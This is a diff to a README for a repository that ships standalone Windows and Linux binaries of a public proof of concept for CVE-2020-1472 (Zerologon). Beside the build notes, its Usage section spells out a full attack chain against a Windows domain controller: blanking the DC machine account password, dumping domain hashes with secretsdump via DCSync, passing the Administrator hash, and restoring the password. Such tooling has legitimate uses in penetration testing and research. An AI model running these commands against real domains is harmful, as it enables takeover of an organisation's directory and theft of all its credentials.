@@ -2,35 +2,49 @@
 
 ### Description
 
-This repository contains static standalone binaries for Windows (x64) of
-[dirkjanm's CVE-2020-1472 POC](https://github.com/dirkjanm/CVE-2020-1472)
-Python scripts: `cve-2020-1472-exploit.exe` and `restorepassword.exe`. All
-credit goes to Tom Tervoort for the
-[original research](https://www.secura.com/blog/zero-logon) and
-Dirk-jan Mollema for the Python scripts.
+This repository contains static standalone binaries for Windows and Linux (both
+x64) of [dirkjanm's
+CVE-2020-1472 POC](https://github.com/dirkjanm/CVE-2020-1472) Python scripts:
+`cve-2020-1472-exploit.exe` and `restorepassword.exe`. All credit goes to Tom
+Tervoort for the [original research](https://www.secura.com/blog/zero-logon)
+and Dirk-jan Mollema for the Python scripts.
 
 The build process is heavily based on work from [ropnop's
 impacket_static_binaries](https://github.com/ropnop/impacket_static_binaries).
-It uses [PyInstaller](http://www.pyinstaller.org/), executed in
-[cdrx's docker image](https://github.com/cdrx/docker-pyinstaller).
+Windows and Linux binaries are built using
+[PyInstaller](http://www.pyinstaller.org/), executed in [cdrx's docker
+image](https://github.com/cdrx/docker-pyinstaller). The Linux binaries are
+built in Ubuntu 12.04 running Glibc 2.15 and should thus be compatible with
+any version of Glibc newer than 2.15.
+
+The main motivation behind this work is to have tooling to restore the DC
+machine account password from Windows operating systems.
 
 ### Build the binaries yourself
 
 The binaries can be build directly from sources using the provided `Makefile`
-and `build_windows.sh` script after installing the `cdrx/pyinstaller-windows`
-docker image. The binaries will be placed in the `tmp_build` folder.
+after retrieving the `cdrx/pyinstaller-windows` / `cdrx/pyinstaller-linux`
+docker images. The newly compiled binaries will be placed in the `tmp_build`
+folder.
 
 ```
-docker pull cdrx/pyinstaller-windows
+# If necessary, to refresh the impacket and CVE-2020-1472 repositories cloned in tmp_build
+make clean
 
+# Windows
+docker pull cdrx/pyinstaller-windows
 make windows
+
+# Linux
+docker pull cdrx/pyinstaller-linux
+make linux
 ```
 
 ### Usage
 
 ```
 # Sets an empty password for the targeted DC machine account.
-cve-2020-1472-exploit.exe "<DC_NETBIOS_NAME>" "<DC_IP>"
+cve-2020-1472-exploit_windows.exe "<DC_NETBIOS_NAME>" "<DC_IP>"
 
 # DCSync using the DC machine account.
 # Static version of secretsdump.py: https://github.com/ropnop/impacket_static_binaries
@@ -41,9 +55,5 @@ secretsdump_windows.exe -just-dc -no-pass "<DOMAIN>/<DC_MACHINE_ACCOUNT$>@<DC_IP
 secretsdump_windows.exe -hashes ":<NTLM>" "<DOMAIN>/<Administrator | DA_USERNAME>@<DC_IP>"
 
 # Restores the DC machine account's original password.
-restorepassword.exe -target-ip "<DC_IP>" -hexpass "<DC_MACHINE_ACCOUNT_HEX_PASSWORD>" "<DOMAIN>/<DC_HOSTNAME>@<DC_HOSTNAME>"
+restorepassword_windows.exe -target-ip "<DC_IP>" -hexpass "<DC_MACHINE_ACCOUNT_HEX_PASSWORD>" "<DOMAIN>/<DC_HOSTNAME>@<DC_HOSTNAME>"
 ```
-
-### TODO
-
-  - Linux standalone binaries
